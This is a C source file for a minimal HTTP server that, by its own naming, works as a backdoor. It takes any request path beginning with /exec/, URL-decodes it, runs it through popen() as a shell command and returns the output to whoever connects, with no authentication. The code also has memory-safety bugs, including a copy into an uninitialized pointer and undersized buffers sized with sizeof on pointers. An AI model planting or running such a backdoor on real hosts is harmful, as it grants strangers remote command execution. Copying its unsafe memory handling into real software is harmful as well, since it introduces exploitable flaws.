//
//  Basic server code was written using the following links -
//  http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html#simpleserver
//  https://rosettacode.org/wiki/Hello_world/Web_server#C
//  http://blog.abhijeetr.com/2010/04/very-simple-http-server-writen-in-c.html
//  http://blog.manula.org/2011/05/writing-simple-web-server-in-c.html
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <zlib.h>

#define BACKLOG 10     // how many pending connections queue will hold

char *no_response = "HTTP/1.1 404 Not Found\r\n"
"Content-Type: text/html; charset=UTF-8\r\n\r\n"
"<!DOCTYPE html><html><head><title>404 Not Found</title></head>"
"<body><h1>Not Found</h1><p>The requested URL was not found on the server</p></body></html>\r\n";

char backdoor_data[] = "%s\n";      //HTTP 200 OK Reply

char recv_data[10000];


//  Code snippet from - http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html#simpleserver
void sigchld_handler(int s)
{
    // waitpid() might overwrite errno, so we save and restore it:
    int saved_errno = errno;
    
    while(waitpid(-1, NULL, WNOHANG) > 0);
    
    errno = saved_errno;
}


//  Code snippet from - http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html#simpleserver
// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }
    
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}


//  Code snippet from - http://stackoverflow.com/questions/2673207/c-c-url-decode-library
void urldecode(char *dst, char *src)
{
    char a, b;
    while (*src) {
        if ((*src == '%') &&
            ((a = src[1]) && (b = src[2])) &&
            (isxdigit(a) && isxdigit(b))) {
            if (a >= 'a')
                a -= 'a'-'A';
            if (a >= 'A')
                a -= ('A' - 10);
            else
                a -= '0';
            if (b >= 'a')
                b -= 'a'-'A';
            if (b >= 'A')
                b -= ('A' - 10);
            else
                b -= '0';
            *dst++ = 16*a+b;
            src+=3;
        } else if (*src == '+') {
            *dst++ = ' ';
            src++;
        } else {
            *dst++ = *src++;
        }
    }
    *dst++ = '\0';
}

//http://stackoverflow.com/questions/26932616/read-input-from-popen-into-char-in-c Used code here for dynamic memory allocation
char *execute_command(char *command)
{
    FILE *fp;
    char buff[10000];
    
    unsigned int size = 1;
    unsigned int strlength;
    char *temp = NULL;
    char *str = malloc(1);
    
    /* Open the command for reading. */
    
    char handle_err[] = " 2>&1";
    strcat(command, handle_err);
    
    fflush(stdout);
    
    fp = popen(command, "r");
    
    if (fp == NULL)
    {
        perror("Failed to run command" );
        exit(1);
    }
    
    //    printf("Size1 : %d\n", strlen(str));
    while (fgets(buff, sizeof(buff) - 1, fp) != NULL)
    {
        strlength = strlen(buff);
        temp = realloc(str, size + strlength);
        if(temp == NULL)
        {
            perror("Memory Allocation");
            exit(1);
        }
        str = temp;
        strcpy(str + size - 1, buff);
        size += strlength;
    }
    /* close */
    pclose(fp);
    //    printf("Size2 : %d\n", strlen(str));
    str[strlen(str)] = '\0';
    return str;
}

//Code snippet from - http://beej.us/guide/bgnet/output/html/multipage/advanced.html
//To send all data
int sendall(int s, char *buf, int *len)
{
    //    printf("inside sendall!!");
    int total = 0;        // how many bytes we've sent
    int bytesleft = *len; // how many we have left to send
    int n;
    
    while(total < *len) {
        n = send(s, buf+total, bytesleft, 0);
        if (n == -1) { break; }
        total += n;
        bytesleft -= n;
    }
    
    *len = total; // return number actually sent here
    
    return n==-1?-1:0; // return -1 on failure, 0 on success
}

//  Code snippet from - http://stackoverflow.com/questions/23137091/capture-signal-in-c-and-kill-all-children - For SigInt cases
void sigint_handler()
{
    //Close all processes and sockets
    exit(0);
}

//  Check if string empty - Ref : http://stackoverflow.com/questions/3981510/getline-check-if-line-is-whitespace
int is_empty(const char *s) {
    while (*s != '\0') {
        if (!isspace(*s))
            return 0;
        s++;
    }
    return 1;
}

//  Code snippet modified from - http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html#simpleserver (and more links mentioned near the headers)
int main(int argc, char *argv[])
{
    signal(SIGINT, sigint_handler);
    
    if(argc != 2)
    {
        perror("No Port provided");
        exit(1);
    }
    
    int PORT = atoi(argv[1]);   //Take port input
    
    int sockfd, new_fd;  // listen on sock_fd, new connection on new_fd
    struct sockaddr_storage their_addr; // connector's address information
    socklen_t sin_size;
    struct sigaction sa;
    struct sockaddr_in name;
    int yes=1;
    char s[INET_ADDRSTRLEN];
    
    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        perror("server: socket");
        exit(1);
    }
    
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
        perror("setsockopt");
        exit(1);
    }
    
    name.sin_family = AF_INET;
    name.sin_port = htons(PORT);
    name.sin_addr.s_addr = htonl(INADDR_ANY);
    
    if (bind(sockfd, (struct sockaddr *) &name, sizeof(name)) == -1) {
        close(sockfd);
        perror("server: bind");
        exit(1);
    }
    
    if (listen(sockfd, BACKLOG) == -1) {
        perror("listen");
        exit(1);
    }
    
    sa.sa_handler = sigchld_handler; // reap all dead processes
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        exit(1);
    }
    
    // main accept() loop
    while(1)
    {
        sin_size = sizeof their_addr;
        new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
        if (new_fd == -1) {
            perror("accept");
            continue;
        }
        
        if (!fork())
        { // this is the child process
            close(sockfd); // child doesn't need the listener
            
            if(recv(new_fd, recv_data, 10000, 0) == -1)
            {
                perror("receive");
            }
            
            char *message;
            
            size_t recv_len = strlen(recv_data);
            
            char *decoded_cmd = malloc(recv_len + 1);
            char *cmd = malloc(recv_len + 1);
            urldecode(decoded_cmd, recv_data);
            char *command = strstr(decoded_cmd, "/exec/");
            char *http_str = NULL;
            
            if(command != NULL)
            {
                http_str = strstr(command, "HTTP/1.1");
            }
            
            if(command != NULL && (command - decoded_cmd) == 4 && http_str != NULL){
                
                size_t len = http_str - command;
                memcpy(cmd, command, len);
                //                printf("%s\n", cmd);
                cmd[len] = 0;
                
                decoded_cmd = cmd + 6;
                int empty = is_empty(decoded_cmd);
                //                printf("%s\n", decoded_cmd);
                
                if(empty)
                {
                    strcpy(message, no_response);
                }
                else
                {
                    char *final_output = execute_command(decoded_cmd);
                    //                    printf("%s - %d\n", final_output, is_empty(final_output));
                    message = malloc(sizeof(final_output) + sizeof(backdoor_data));
                    sprintf(message, backdoor_data, final_output);
                    
                }
            }
            else
            {
                strcpy(message, no_response);
            }
            
            //            printf("final - %s", message);
            int len = strlen(message);
            
//            char *out = malloc(len);
//            z_stream strm;
//            strm.avail_out = message;
//            strm.next_out = out;
            
//            if(ret = deflate(&strm, flush) == Z_STREAM_ERROR){
//                perror("Encoding");
//                exit(1);
//            }
            
            len = strlen(message);
            if (sendall(new_fd, message, &len) == -1)
            {
                perror("send");
            }
            
            close(new_fd);
            exit(0);
        }
        close(new_fd);  // parent doesn't need this
    }
    
    return 0;
}
